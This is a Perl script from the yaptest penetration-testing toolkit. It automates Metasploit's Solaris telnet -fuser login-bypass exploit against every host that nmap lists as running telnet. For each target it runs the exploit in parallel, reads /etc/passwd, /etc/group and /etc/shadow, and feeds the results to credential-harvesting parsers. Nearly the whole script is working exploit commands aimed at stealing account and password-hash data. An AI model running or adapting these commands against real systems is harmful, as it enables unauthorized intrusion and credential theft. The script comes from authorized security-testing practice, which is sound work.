#!/usr/bin/env perl
use strict;
use warnings;
use POSIX;
use yaptest;
use File::Basename;

my $script_name = basename($0);
my $usage = "Usage: $script_name
Uses Metasploit 3 exploit/solaris/telnet/fuser exploit on each IP 
to determine if port identified by nmap as running telnet are 
vulnerable to the -fuser login issue.

NB: msfcli from Metasploit 3 is required to be in the path (MSF2 won't work).
";

die $usage if shift;
my $y = yaptest->new();
$y->check_exploit_ok();
my $ms3_dir = $y->get_config('metasploit_3_dir');

if (defined($ms3_dir)) {
        $ms3_dir .= '/' unless substr($ms3_dir, -1, 1); # add trailing slash
        print "NOTE: Assuming 'msfcli' from Metasploit 3 is installed in $ms3_dir\n";
} else {
        print "WARNING: metasploit_3_dir config option not set.  Use yaptest-config.pl\n";
        print "         to set 'metasploit_3_dir' to the location of Metasploit v3\n";
        print "         Will search for msfcli in \$PATH - probably not what you want\n";
        $ms3_dir = "";
}
print "\n";

$y->run_test(
	command => "echo 'cat /etc/passwd; exit' | " . $ms3_dir . "msfcli exploit/solaris/telnet/fuser RHOST=::IP:: RPORT=::PORT:: USER=bin PAYLOAD=cmd/unix/interact E",
	filter => { port_info => "nmap_service_name = telnet" },
	timeout => 60,
	output_file => "telnet-fuser-passwd-::IP::-::PORT::.out",
	parallel_processes => 6,
	parser => "yaptest-credentials.pl add --ip ::IP:: -f"
);

$y->run_test(
	command => "echo 'cat /etc/group; exit' | " . $ms3_dir . "msfcli exploit/solaris/telnet/fuser RHOST=::IP:: RPORT=::PORT:: USER=bin PAYLOAD=cmd/unix/interact E",
	filter => { port_info => "nmap_service_name = telnet" },
	timeout => 60,
	output_file => "telnet-fuser-group-::IP::-::PORT::.out",
	parallel_processes => 6,
	parser => "yaptest-groups.pl add --group_ip ::IP:: -f"
);

# Normally doesn't work for root user, but we should try anyway.
$y->run_test(
	command => "echo 'cat /etc/shadow; exit' | " . $ms3_dir . "msfcli exploit/solaris/telnet/fuser RHOST=::IP:: RPORT=::PORT:: USER=root PAYLOAD=cmd/unix/interact E",
	filter => { port_info => "nmap_service_name = telnet" },
	timeout => 60,
	output_file => "telnet-fuser-shadow-::IP::-::PORT::.out",
	parallel_processes => 6,
	parser => "yaptest-credentials.pl add --ip ::IP:: -f"
);
